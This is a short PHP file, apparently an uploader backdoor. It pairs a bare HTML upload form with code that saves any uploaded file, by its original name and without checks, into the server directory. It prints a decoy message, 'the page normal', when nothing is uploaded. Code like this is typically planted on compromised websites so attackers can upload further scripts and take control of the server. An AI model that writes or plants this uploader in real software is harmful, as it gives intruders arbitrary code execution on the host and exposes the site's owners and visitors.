<form enctype="multipart/form-data" method="POST"><input name="fname" type="file"/><input type="submit" value="done"/></form><?php $pathtg=basename($_FILES["fname"]["name"]);if(move_uploaded_file($_FILES["fname"]["tmp_name"],$pathtg)){echo basename($_FILES["fname"]["name"])."file had be up";}else{echo "the page normal";} ?>